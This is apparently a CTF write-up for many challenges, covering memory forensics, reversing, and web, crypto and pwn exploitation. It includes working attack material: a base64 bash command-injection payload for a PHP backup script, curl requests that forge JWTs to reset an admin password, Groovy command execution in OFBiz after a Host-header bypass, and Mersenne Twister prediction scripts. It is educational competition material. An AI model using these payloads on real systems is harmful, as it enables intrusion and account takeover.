# scattered

We are given a PCAP file, where we can observe multiple various UDP streams for sending files, where there are some PNG files being sent. Following the streams for each file, we see some are dummy files, used as bait, whereas others are legitimate parts of the flag. Decoding all streams will yield the flag, after some tries since parts of the flags are messed up and guessy-like work :(.

Flag: `CTF{28193EAB5B637041AEA835924E8A712476BC88A21A25862B78732AB336BA2F33}`

# jvroom

We are given a memory dump, thus volatility is the tool for this.

1. 19041 (windows.info plugin and get the major version)
2. 7296 (windows.pslist and search for notepad.exe)
3. explorer.exe (from the previous question, get the PPID and search for it in the PID list)
4. 73 (windows.cmdline and look for the command line for opening the notepad)
5. xxd (general knowledge question, it was either xxd or hxd)
6. toyota (from the command line at 4)
7. w1Nd0W5_w1Th_f0Rd_r4M (just search for toyota using a hex dump and get the base64 from there)
8. supra (from the same search as in 7)
9. 2f86bf60 (xxd memdump.mem | grep supra)

# pin-v2

We are given a binary that requests 15 different values from us, that form a PIN. If we pass all checks, the flag is shown.

```C
undefined4
check_pin(uint param_1,int param_2,int param_3,int param_4,char param_5,char param_6,char param_7,
         char param_8,int param_9,int param_10,int param_11,uint param_12,int param_13,uint param_14
         ,int param_15)
{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  int iVar5;
  uint uVar6;
  undefined4 uVar7;

  iVar5 = rand();
  uVar6 = iVar5 % 1000;
  if ((param_1 == 2) || (param_2 == 2)) {
    bVar1 = false;
  }
  else {
    bVar1 = true;
  }
  if ((param_6 == 'R') && (param_7 == 't')) {
    bVar2 = true;
  }
  else {
    bVar2 = false;
  }
  if ((param_9 == 10) && (param_10 == param_11)) {
    bVar3 = true;
  }
  else {
    bVar3 = false;
  }
  if ((((param_1 == 0) && (param_12 == 0x7f)) && (param_3 == 1)) && ((uVar6 & 7) == 7)) {
    bVar4 = true;
  }
  else {
    bVar4 = false;
  }
  if ((((bVar1) && (param_3 != 2)) && ((param_4 != 1 && ((param_5 == '$' && (bVar2)))))) &&
     ((param_8 != 'O' &&
      (((((bVar3 && ((param_1 ^ param_12) == (uVar6 & 0xff))) && (param_13 + param_4 == 0xff)) &&
        (((int)(param_1 ^ param_14) % 8 == (uVar6 & 7) && (param_15 + param_4 == 0x7f)))) && (bVar4)
       ))))) {
    uVar7 = 1;
  }
  else {
    uVar7 = 0;
  }
  return uVar7;
}
```

Reversing that, we get the following conditions:
```
param_1 == 0
param_2 != 2
param_3 == 1
param_4 != 1
param_5 == '$'
param_6 == 'R'
param_7 == 't'
param_8 != 'O'
param_9 == 10
param_10 == param_11
param_1 ^ param_12 = param_12 == 0x7f (127)
param_13 + param_4 == 0xff (255)
(param_1 ^ param_14) = param_14 % 8 == 7
param_15 + param_4 == 0x7f (127)
```
Thus, constructing a pin that will respect that yields the flag.

```Python
from pwn import *
p = remote("34.159.177.110", 30438)
pin = ['0', '5', '1', '2', '$', 'R', 't', 'X', '10', '9', '9', '127', '253', '7', '125']
for x in pin:
	print(p.recv())
	p.sendline(x.encode())
print(p.recv())

```

Flag: `CTF{ea875111287b0f7dd1db64c131e59ba2005e7a4611bace7aab827627e4161acc}`

# og-jail

Connecting to the given service, we are presented with the prompt `pyjail>>>`, thus one can guess that we are supposed to escape the python jail. Running help as told to yields an error that shows the code is using literal_eval, which is expecting a string, so we try `"open('flag.txt').read()"` and it worked.

Flag: `ctf{97829f135832f37a4b3d6176227cf6b96d481d543e6051c0087f24c1cd0881ed}`

# hangman

We are given a hangman game via a `nc` instance, which doesn't guess real words. After trying to fiddle with some command injections, we see that it only accepts alphabetical characters, and only 1 single character at a time. I was running out of ideas, so I decided to just spam a single letter, and eventually it seems to have broken the game and given us the flag, weird.

Flag: `ctf{609e75158367c10d4bd189db41206dbdde4d1c542279ea5275bbcdf440af7509}`

# keep-it-locked

Very nice chall ^.^.
We are given another memory dump, so off to volatility it goes.
When we list the running processes using `windows.pslist`, we see an interesting executable there, named `KeeTheft.exe` (naming related to KeePass Password manager). So, we dump it (first get its address via `windows.filescan` and then use `windows.dumpfiles` to get it).

That EXE is a .NET executable that dumps keys and passwords from protected KeePass blobs, and prints them out on the screen. Thus, we next go and use `windows.consoles`, to hopefully catch the printed info, and we do:
```
PS C:\ProgramData\Release> .\KeeTheft.exe

Database             : C:\Users\windows\Desktop\Database.kdbx
KeyType              : KcpPassword
KeePassVersion       : 2.58.0.0
ProcessID            : 1004
ExecutablePath       : C:\Program Files\KeePass Password Safe 2\KeePass.exe
EncryptedBlobAddress : 53811088
EncryptedBlob        : F0-97-D4-DB-0F-87-81-C3-9A-1D-BE-2D-A9-91-2B-A3-69-F9-58-30-E1-52-83-69-ED-E4-4B-18-23-81-A2-D1
EncryptedBlobLen     : 32
PlaintextBlob        : 74-30-6D-61-74-30-50-6F-74-40-74-6F-53-6F-75-70-31-31-31-00-00-00-00-00-00-00-00-00-00-00-00-00
Plaintext            : t0mat0Pot@toSoup111
```

From there, we can see the master password and the database's location, and as such, we again go with `windows.filescan` and `windows.dumpfiles` to get the database, load it into KeePass and use the master password to get the password for `Flag`.

Flag: `UNR{n0_p@ss0rd_man@g3r_can_KEE_m3_0ut}`

# malware-chousa

1. start.bat (use FTK imager for the image.ad1 file and navigate to the Desktop)
2. Security (event ID 4720 for user creation - search for it and input the Channel shown there)
3. artifact (from same events as before)
4. .a4k (from FTK imager, just look around in Documents for example and see the weird extension)
5. 192.168.100.47 (from the pcap, see the GET request for `/backdoor`)
6. HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (typical registry key used for startup persistence, just search the .reg file for it and see that we have the atomic stuff set up there)
7. C:\Users\atomi\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (typical path for the PS history, search for it using FTK imager and get the full path from the actual file itself)
8. CTF{u4vz7r1yq2t9x0p8w5j3k7m6l2c1n0z} (from the console history as well, we have a request with a parameter that's the flag)

# phpwn

We are given a simple PHP webpage, where we're asked for a UUID and then there is some command building for a backup script that runs once a minute.
```PHP
function setbackup($uuid, $content){
    $raw_json = ['uuid' => $uuid, 'm_threaded' => false, 'supplier' => false, 'initial_content' => $content];
    $json = json_encode($raw_json);
    $json = addslashes($json);
    $output = "echo Backing up user data: \"{$json}\";\n";
    $output .= "cp /var/www/html/data/$uuid /backup/;\n\n";
    file_put_contents('/var/www/html/private/backup.sh', $output, FILE_APPEND);
}

```

First, I tried to bypass the uuid and inject payloads there, but quickly reached a dead-end since the regex didn't allow for any messing. Then, I saw that our contents are printed to the page, but using `htmlspecialchars` which nerfs any other command injection. So, our only avenue of attack remains to try and bypass the `json_encode` and `addslashes`. Via quick testing with a local script reproducing those steps, we see that we cannot input any paths into that, since they will get slashed and not be correct. After that, I began testing to see if regular command expression characters are escaped ($), and it seems like not and we are indeed able to execute commands as such. So, the option here is to use base64 to decode the executed command and copy the flag in our location.

Payload: `}$(echo YmFzaCAtYyAiY2F0IC90bXAvZmxhZy50eHQgPiAvdmFyL3d3dy9odG1sL2ZsYWcudHh0Ig== | base64 -d | bash);#`

After sending the payload, wait for a quick second and then navigate to flag.txt and profit.

Flag: `CTF{f4349967e93964f125623e2832cec93e4d15e1c6b9303cc89bb3f22c2514d77c}`

# bnc

We are given a Python script with some crypto stuff in it. We are to play a game "Bear, Cowboy, Ninja", which seems to be another variant of "Rock, Paper, Scissors". The computer chooses randomly, with a time seed initialized with the current time, and we have to beat it 30 times in a row to get the flag. Given the simple game, we could just write a bruteforcer for the seed, pregenerate the computer's choices (since they are deterministically determined by the seed) and choose the correct inputs to beat it based on the game's rules.

```Python
from pwn import *
import random
import time

choices = ["Bear", "Ninja", "Cowboy"]
rules = {
    "Bear": "Ninja",
    "Ninja": "Cowboy",
    "Cowboy": "Bear"
}

def winning_move(computer_choice):
    for player_choice, beaten_choice in rules.items():
        if beaten_choice == computer_choice:
            return player_choice

def exploit(seed):
    try:
        p = remote("34.159.72.10", 30942)
        random.seed(seed)
        predicted_moves = [random.choice(choices) for _ in range(30)]
        winning_moves = [winning_move(move) for move in predicted_moves]
        welcome = p.recvuntil(b"Type your choice: ")
        for i, move in enumerate(winning_moves):
            p.sendline(move.encode())
            try:
                result = p.recv()
                if b"You lose" in result:
                    log.error(f"Lost on move {i+1}, wrong seed")
                    p.close()
                    return False
                
                log.info(f"Move {i+1}/30: still on track")
                if i == len(winning_moves) - 1:
                    if b"ctf" in result:
                        log.success(f"Flag: {result.decode()}")
                    else:
                        log.error("No flag")
                    
                    p.close()
                    return True
            
            except Exception:
                log.error(f"Connection closed unexpectedly on move {i+1}")
                return False
        p.close()
        return False
    except Exception as e:
        log.error(f"Err: {e}")
        return False

if __name__ == "__main__":
    base_seed = int(time.time())
    log.info(f"Base seed: {base_seed}")
    for offset in range(0, 60):
        for sign in [-1, 1]:
            seed_to_try = base_seed + (sign * offset)
            log.info(f"Seed: {seed_to_try} (offset: {sign * offset})")
            try:
                if exploit(seed_to_try):
                    log.success(f"Success with seed: {seed_to_try}")
                    exit(0)
            except Exception:
                continue
    
    log.error("Failed")
```

Flag: `ctf{5fd924625f6ab16a19cc9807c7c506ae1813490e4ba675f843d5a10e0baacdb8}`

# stolen-data

By reversing the android app, we see a few auth endpoints (`/api/auth/change-password`, `/api/auth/me`, `/api/auth/login`, `/api/auth/register`, `/api/auth/reset-password`), so we try and look into those.
```Java
public interface AuthApi {
   @POST("/api/auth/change-password")
   Object changePassword(@Body ChangePasswordRequest var1, Continuation var2);

   @POST("/api/auth/me")
   Object getUserInfo(@Body UserInfoRequest var1, @Header("Authorization") String var2, Continuation var3);

   @POST("/api/auth/login")
   Object login(@Body LoginRequest var1, Continuation var2);

   @POST("/api/auth/register")
   Object register(@Body RegisterRequest var1, Continuation var2);

   @POST("/api/auth/reset-password")
   Object resetPassword(@Body ResetPasswordRequest var1, Continuation var2);
}

```

We see some artifacts related to JWTs in change-password, and some lack of checking of it on the rest of the endpoints. By looking more through the application, we see in some of the notes classes that there is an admin email present - `admin@inovative.notes`. As such, a path of attack takes contour, getting access to the admin account, which presumably will give us the flag. I followed a simple path, create a user to receive a token, then used that token (and the lack of verification of it), just to authorize requests and change the password for the admin, since there are no proper JWT signature checks for `change-password`. 
```Java
            var19 = var3;
            if (var3 == null) {
               try {
                  Intrinsics.throwUninitializedPropertyAccessException("authToken");
               } catch (Exception var17) {
                  var10000 = var17;
                  var10001 = false;
                  break label140;
               }

               var19 = null;
            }

            label141: {
               label142: {
                  try {
                     if (var19.length() > 10) {
                        var3 = this.B;
                        break label142;
                     }
                  } catch (Exception var16) {
                     var10000 = var16;
                     var10001 = false;
                     break label140;
                  }

                  try {
                     var3 = this.B;
                  } catch (Exception var13) {
                     var10000 = var13;
                     var10001 = false;
                     break label140;
                  }

                  var19 = var3;
                  if (var3 == null) {
                     try {
                        Intrinsics.throwUninitializedPropertyAccessException("authToken");
                     } catch (Exception var12) {
                        var10000 = var12;
                        var10001 = false;
                        break label140;
                     }

                     var19 = null;
                  }
                  break label141;
               }

               var19 = var3;
               if (var3 == null) {
                  try {
                     Intrinsics.throwUninitializedPropertyAccessException("authToken");
                  } catch (Exception var15) {
                     var10000 = var15;
                     var10001 = false;
                     break label140;
                  }

                  var19 = null;
               }

               try {
                  var3 = var19.substring(0, 10);
                  Intrinsics.checkNotNullExpressionValue(var3, "this as java.lang.String…ing(startIndex, endIndex)");
                  var21 = new StringBuilder();
                  var21.append(var3);
                  var21.append("...");
                  var19 = var21.toString();
               } catch (Exception var14) {
                  var10000 = var14;
                  var10001 = false;
                  break label140;
               }
            }

            StringBuilder var24;
            try {
               var24 = new StringBuilder("Auth token: ");
               var24.append(var19);
               Log.d("ChangePasswordActivity", var24.toString());
               var3 = this.B;
            } catch (Exception var11) {
               var10000 = var11;
               var10001 = false;
               break label140;
            }

            var19 = var3;
            if (var3 == null) {
               try {
                  Intrinsics.throwUninitializedPropertyAccessException("authToken");
               } catch (Exception var10) {
                  var10000 = var10;
                  var10001 = false;
                  break label140;
               }

               var19 = null;
            }

            int var20;
            List var27;
            try {
               var27 = StringsKt.t(var19, new String[]{"."});
               var20 = var27.size();
               var24 = new StringBuilder("JWT parts count: ");
               var24.append(var20);
               Log.d("ChangePasswordActivity", var24.toString());
               var20 = var27.size();
            } catch (Exception var9) {
               var10000 = var9;
               var10001 = false;
               break label140;
            }

            if (var20 > 1) {
               try {
                  byte[] var28 = Base64.decode((String)var27.get(1), 8);
                  Intrinsics.checkNotNullExpressionValue(var28, "decode(...)");
                  var3 = new String(var28, Charsets.UTF_8);
                  Log.d("ChangePasswordActivity", "Decoded payload: ".concat(var3));
                  JSONObject var29 = new JSONObject(var3);
                  Iterator var25 = var29.keys();
                  Intrinsics.checkNotNullExpressionValue(var25, "keys(...)");
                  List var22 = SequencesKt.toList(SequencesKt.asSequence(var25));
                  var24 = new StringBuilder("JSON keys: ");
                  var24.append(var22);
                  Log.d("ChangePasswordActivity", var24.toString());
                  var19 = var29.optString("email");
                  this.D = var19;
                  var24 = new StringBuilder("Extracted email: ");
                  var24.append(var19);
                  Log.d("ChangePasswordActivity", var24.toString());
                  break label133;
               } catch (Exception var7) {
                  Exception var5 = var7;

                  try {
                     var19 = var5.getMessage();
                     var24 = new StringBuilder("Error decoding payload: ");
                     var24.append(var19);
                     Log.e("ChangePasswordActivity", var24.toString());
                     var5.printStackTrace();
                     break label133;
                  } catch (Exception var6) {
                     var10000 = var6;
                     var10001 = false;
                  }
               }
            } else {
               try {
                  Log.e("ChangePasswordActivity", "Invalid JWT format: not enough parts");
                  break label133;
               } catch (Exception var8) {
                  var10000 = var8;
                  var10001 = false;
               }
            }
         }

         Exception var26 = var10000;
         String var23 = var26.getMessage();
         var21 = new StringBuilder("Failed to parse token: ");
         var21.append(var23);
         Log.e("ChangePasswordActivity", var21.toString());
         var26.printStackTrace();
         var3 = var26.getMessage();
         var21 = new StringBuilder("Failed to parse token: ");
         var21.append(var3);
         this.r(var21.toString());
      }

```

But for changing the password, we need to userId, which we can get from `/api/auth/me`, which takes in an email and returns the userId.
So, by registering with a dummy user, using the generated token (or generate it manually) to access `/api/auth/me` to get the userid of the admin, and then using that to change the password, we successfully get admin login.

```bash
(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com", "password":"test", "name": "alex"}' \
  http://34.107.35.141:31166/api/auth/register
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3Zjk4NWVhODUwYTI0ZTMwNDFjMDJlMiIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsImlhdCI6MTc0NDQwNTk5NCwiZXhwIjoxNzQ1MDEwNzk0fQ.sPhtJxV32yy0wdTLd-UBwsgfq2XTHSqr-WgLWXhd9AM","user":{"id":"67f985ea850a24e3041c02e2","name":"alex","email":"test@test.com"}}

(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@inovative.notes"}' \
  -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3Zjk4NWVhODUwYTI0ZTMwNDFjMDJlMiIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsImlhdCI6MTc0NDQwNTk5NCwiZXhwIjoxNzQ1MDEwNzk0fQ.sPhtJxV32yy0wdTLd-UBwsgfq2XTHSqr-WgLWXhd9AM" http://34.107.35.141:31166/api/auth/me
{"user":{"id":"67f97c4e850a24e3041c02d2","name":"Admin User","email":"admin@inovative.notes"}}

(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -X POST -H "Content-Type: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3Zjk4NWVhODUwYTI0ZTMwNDFjMDJlMiIsImVtYWlsIjoiYWRtaW5AaW5vdmF0aXZlLm5vdGVzIiwiaWF0IjoxNzQ0NDA1OTk0LCJleHAiOjE3NDUwMTA3OTR9.9th4D_thgRLVh6nwTfAGQHVWGmDNJtthtSRbyOgEKGs" -d '{"newPassword":"test", "userId": "67f97c4e850a24e3041c02d2"}' http://34.107.35.141:31166/api/auth/change-password
{"message":"Password changed successfully"}

(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@inovative.notes", "password":"test"}' \
  http://34.107.35.141:31166/api/auth/login
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3Zjk3YzRlODUwYTI0ZTMwNDFjMDJkMiIsImVtYWlsIjoiYWRtaW5AaW5vdmF0aXZlLm5vdGVzIiwiaWF0IjoxNzQ0NDA2ODQ2LCJleHAiOjE3NDUwMTE2NDZ9.ibYJKyCJJy3eH6lupTfPMxZzsocwdz96MWCRClCW0IA","user":{"id":"67f97c4e850a24e3041c02d2","name":"Admin User","email":"admin@inovative.notes"}} 
```

Aaand, nothing. So, that token is just a simple JWT with nothing interesting in it. This means we have to get back to reversing the application. Looking more through it, we also see some notes APIs:
```Java
public interface NotesApi {
   @POST("/api/notes")
   Object createNote(@Header("Authorization") String var1, @Body CreateNoteRequest var2, Continuation var3);

   @DELETE("/api/notes/{id}")
   Object deleteNote(@Header("Authorization") String var1, @Path("id") String var2, Continuation var3);

   @GET("/api/notes/{id}")
   Object getNoteById(@Header("Authorization") String var1, @Path("id") String var2, Continuation var3);

   @GET("/api/notes")
   Object getNotes(@Header("Authorization") String var1, Continuation var2);
}

```

What sparks our interest is the GET `/api/notes`. Running that with the token of the admin yields the flag.
```bash
(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -X GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3Zjk3YzRlODUwYTI0ZTMwNDFjMDJkMiIsImVtYWlsIjoiYWRtaW5AaW5vdmF0aXZlLm5vdGVzIiwiaWF0IjoxNzQ0NDA2ODQ2LCJleHAiOjE3NDUwMTE2NDZ9.ibYJKyCJJy3eH6lupTfPMxZzsocwdz96MWCRClCW0IA' http://34.107.35.141:31166/api/notes     
[{"_id":"67f97c4f850a24e3041c02d5","userId":"67f97c4e850a24e3041c02d2","title":"Secret Notes","content":"Yahoo credentials: username: l33t_h4cker. \n Password: CTF{9a4477c0b485e0427c177e1b4274df935f3bc867e537aae5bd54e0b22ea71eb1}","createdAt":"2025-04-11T20:32:15.038Z","updatedAt":"2025-04-11T20:32:15.039Z","__v":0}] 
```
Flag: `CTF{9a4477c0b485e0427c177e1b4274df935f3bc867e537aae5bd54e0b22ea71eb1}`

# gaming-habits

After running the given image through image search, it become obvious that it was from the DayZ map Chernarus. Passing it along to my friend ChatGPT together with the data I found, it was able to yield the town, and from there I used [https://dayz.xam.nu/#location=12969.96;15036.33;9] to navigate the map and find the hut, together with the coordinates required.

`Dobroye(1.29:0.03)NE`

Flag: `CTF{6acfb96047869efed819b66c2bab15565698d8295ca78d7d4859a94873dcc5ce}`

# silent-beacon

We are given a PCAP with some Bluetooth transmissions. After some looking into it, we see that the main device talking is some Intel ... , from bit-sentinel, and mostly of what we see are some `SBC` (subband codec) packets sent towards it as an audio sink. So, I extracted all said packets and converted them into wav ([https://www.botanica.software/post/unraveling-the-bluetooth-enigma-extracting-the-flag-from-bsides-tlv-2022-ctf]), but there was nothing audible or useful there. At this point I went a little bit into a rabbit hole by trying various steganography techniques for the audio, but they yielded no result.

After that, I went back to the PCAP and looked some more, and found couple `OBEX` (Object Exchange) packets, sending an mp3 file to the remote device, so I carved those out and created the MP3 (LAME encoded MP3, no usual ID3 header - that threw me off for a bit), and that MP3 has the flag spelled out (I used msword to transcribe it for me).

```bash
(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# tshark -r ./capture.pcap -d "btl2cap.cid==0x0046,bta2dp" -T json -x > data2.json

(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# python
Python 3.12.9 | packaged by conda-forge | (main, Mar  4 2025, 22:48:41) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import json
>>> j = json.loads(open("data2.json").read())
>>> obex = [ _ for _ in [i["_source"]["layers"].get("obex") for i in j] if _ is not None]
>>> obex = [x.get("obex.headers") for x in obex if x.get("obex.headers") is not None]
>>> obex = [x.get("obex.header") for x in obex if x.get("obex.header") is not None]
>>> obex = [x.get("obex.header.value.byte_sequence_raw") for x in obex if x.get("obex.header.value.byte_sequence_raw") is not None]
>>> data = "".join(frame[0] for frame in obex)
>>> open("flag.mp3", "wb").write(bytes.fromhex(data))
>>> exit()

(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# file flag.mp3                                                                        
flag.mp3: MPEG ADTS, layer III, v2,  48 kbps, 24 kHz, Monaural
```

Flag: `CTF{32faf5270d2ac7382047ac3864712cd8cb5b8999511a59a7c5cb5822e0805b91}`

# open-for-business

We start off this challenge as all web challenges, with entering the browser, and we seem to receive a 404. So, off to ffuf.

```
(base) ┌──(root㉿kali)-[/home/kali/Desktop]
└─# ffuf -X GET -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://65.109.131.17:1337/FUZZ      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://65.109.131.17:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 484ms]
content                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 500ms]
common                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 742ms]
catalog                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 244ms]
marketing               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2098ms]
ecommerce               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1021ms]
ap                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 561ms]
ar                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 258ms]
ebay                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1028ms]
manufacturing           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
passport                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 53ms]
example                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 53ms]
bi                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 49ms]
accounting              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
webtools                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
tomahawk                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 50ms]
facility                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
myportal                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
sfa                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 53ms]
```

We see quite a few endpoints, but trying to access them says something about the domain not allowed for the `Host` header. At this point I left that as is and went on to search for some CVEs, since we see that the website uses `OFBiz`. I tried a few CVEs, but none worked, so we get back to that Host thingy. Setting as the header `Host: 127.0.0.1` seems to bypass that and allow us to access stuff. Querying some interesting endpoints to see their data, we see that in `/webtools/controls/main`, we are given an example login `admin:ofbiz`. Accessing `/webtools/control/login` and logging in with those values grants us access (had to directly modify the webpage to make requests for the actual domain and not localhost).

Fiddling through that control panel, I see that in the `Import/Export` tab we have `Programmable Export` (which, from the previous CVEs tested, allowed us to run groovy programs). So, I went there and tried running some groovy scripts, but the output just wasn't there. Researching a bit, I've discovered that `stdout` may be redirected somewhere else, so I checked the logs and saw that nothing popped out there. Given that one of the exploits I tried used exceptions to return the output of a command, I decided to try myself that and it worked, we get command execution.
```groovy
throw new Exception("pwd".execute().text);
throw new Exception("ls".execute().text);
throw new Exception("ls ..".execute().text);
throw new Exception("cat ../flag.txt".execute().text);
```

Flag: `CTF{2378f7c994cd18ee3206f253744aea876734a3ed4e6a7244a9f70f73e86ac833}`

# wheel-of-fortune

We are given a remote instance, where we have to guess a number from 1 to 100, and the server shows its calculations for how it derived that value. 

```
Guess the number between 1 and 100: 1
Wrong! Your points are reset to 0.
Initial value: 4243960676
Step-by-step formula calculation:
((((4243960676 ^ 7) * 37 + 29) // 10000 + 1 ) % 100) + 1= 56
```
I played with that for a bit, and it had no obvious vulnerabilities, so I went on to do some research about PRNGs and how we could determine the initial values used so we can guess the number.

I started gathering values and trying an LCG solver, but it couldn't find any good relationship so I abandoned that, and went on to test other PRNGs. I gathered quite a few values to see whether there are some repeating ones or if there's a cycle, but I couldn't find any.

From there, I went on to test some of the known PRNGs, the one from libc and the one from Python, since most possibly the application is written in one of these 2 languages. So, I wrote a test C program to test a few common and simple seeds, but the values didn't seem to match. I then went on and tried to match it to a time-based seed, which didn't yield anything useful. So, I went on to do some research about the Python PRNG used by random, and found that you can actually reverse it given enough inputs ([https://book.jorianwoltjer.com/cryptography/pseudo-random-number-generators-prng]). Testing this on data from our given initial values, we see that we can successfully get the seed from the Mersenne Twister used by Python's random and correctly get the next initial values used. With this, we can then correctly guess the values used by the service. By guessing correctly for a lot of times, we get the flag.

```Python
from pwn import *

def get_guess(value):
    return ((((value ^ 7) * 37 + 29) // 10000 + 1) % 100) + 1

p = remote("34.159.27.166", 30326)
values = []
print(p.recv())
for _ in range(624):
    p.sendline(b"1")
    r = p.recv()
    val = r[r.find(b"Initial value: ") + 15:].split(b"\n")[0].strip()
    values.append(int(val))
    # print("did iter ", _)



from mt19937predictor import MT19937Predictor
pred = MT19937Predictor()
for i in range(624):
    pred.setrandbits(values[i], 32)


while True:
    p.sendline(str(get_guess(pred.getrandbits(32))).encode())
    print(p.recv())
p.close()

```

Flag: `ctf{49e6b3ba5aa5a624d22dd1d2cc46804b5d3c51b13096dffb5cd6af8a9ec4eed5}`

# scoala-de-paunari

## year1

We are given this function, and we need to somehow guess the base address in a PIE executable, using that write primitive (negative offsets work because of the check).
```C
unsigned __int64 year1()
{
  int v1; // [rsp+Ch] [rbp-24h] BYREF
  _QWORD v2[2]; // [rsp+10h] [rbp-20h] BYREF
  char *v3; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts(aAnul1);
  puts("[*] Bun venit Bobocule! In primul an ne vom concentra pe intelegerea Zonelor de Memorie asociate Executabilului.");
  printf(" > Introdu un numar cuprins intre 0-9: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 9 )
  {
    puts("[!] Numar incorect! Ne vedem la toamna.");
    exit(1);
  }
  printf(" > Introdu o noua valoare: ");
  __isoc99_scanf("%ld", &global_array[v1]);
  printf("   Valoarea introdusa la index %d este = 0x%lx\n", v1, global_array[v1]);
  printf(" > Introdu Adresa de memorie unde incepe Executabilul: ");
  __isoc99_scanf("%lx", v2);
  v2[1] = (char *)main - 6487;
  if ( (int (__fastcall *)(int, const char **, const char **))((char *)main - 6487) != (int (__fastcall *)(int, const char **, const char **))v2[0] )
  {
    puts("[!] Valoarea introdusa este gresita! Ne vedem la toamna.");
    exit(1);
  }
  v3 = getenv("FLAG1");
  if ( v3 )
    printf("[*] Felicitari! Diploma de absolvire a anului intai: %s\n", v3);
  else
    puts("[*] Felicitari! Contacteaza adminul pentru a obtine diploma de absolvire.");
  puts(&byte_55555555643A);
  return v4 - __readfsqword(0x28u);
}
```
Also, our `global_array` is in a 0x1000 size rw segment, at offset 0x3e20 (in `.bss`) from the binary, thus we can only try to overwrite stuff in the area `[0x3e20 + -452 * 8, 0x3e20 + 9 * 8]`. Looking around next to our array, there isn't really anything useful we could overwrite to somehow guess the base address, so we have to figure some stuff out. After some more analysis, I decided to try and see if we can somehow turn our write primitive into a read primitive, trying to send bogus characters to scanf, and IT WORKED. Apparently sending `+` or `-` doesn't mess up the binary, but still makes scanf exit properly and not write anything, thus turning our write primitive into a read primitive. 

Now, we just need to find a pointer to somewhere close, such that we can deduce the base address from the offset. Looking close from our `global_array`, we see that at offset `-80` we have a pointer to `__dso_handle`, which it at offset `0x3dd0` from the base address. Thus, using the index `-10` (`-80 / 8`) and putting a `+` or a `-` sign for the value to be written we can read the pointer, then subtract its known offset from the base and get our binary's base address, and hence get the flag.

Flag: `CTF{plu5_s1_minu5_1n_sc4nf_d3zvalu1e_s3cre7e}`

## year2

For year 2, we have the following code:
```C
unsigned __int64 year2()
{
  _QWORD v1[2]; // [rsp+8h] [rbp-28h] BYREF
  char *v2; // [rsp+18h] [rbp-18h]
  char format[4]; // [rsp+23h] [rbp-Dh] BYREF
  char v4; // [rsp+27h] [rbp-9h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts(aAnul2);
  puts(
    "[*] Bun venit Juniorule! In al doilea an ne vom concentra pe intelegerea literaturii, motiv pentru care vom vizita B"
    "iblioteci si Librarii.");
  *(_DWORD *)format = 0;
  v4 = 0;
  printf(" > Introdu un cuvant de 4 caractere: ");
  __isoc99_scanf("%4s", format);
  printf("   ");
  printf(format);
  putchar(10);
  printf(" > Introdu Adresa de memorie unde incepe libc: ");
  __isoc99_scanf("%lx", v1);
  v1[1] = &puts - 62952;
